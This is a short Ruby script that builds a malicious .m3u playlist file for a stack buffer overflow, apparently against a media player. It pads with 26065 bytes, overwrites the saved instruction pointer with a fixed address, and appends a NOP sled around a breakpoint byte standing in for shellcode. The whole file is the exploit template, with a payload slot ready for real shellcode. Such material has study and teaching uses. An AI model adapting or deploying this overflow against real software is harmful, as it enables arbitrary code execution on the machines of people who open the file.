#!/usr/bin/env ruby

file = "test1.m3u"

junk = "\x41" * 26065
eip = "\x38\xFD\x0F\x00" # memory address 000FFD38

shellcode = "\x90" * 25
shellcode = shellcode + "\xcc"
shellcode = shellcode + "\x90" * 25

exploit = junk + eip + shellcode

File.open(file, 'w') {|f| f.write(exploit)}
puts "File #{file} created"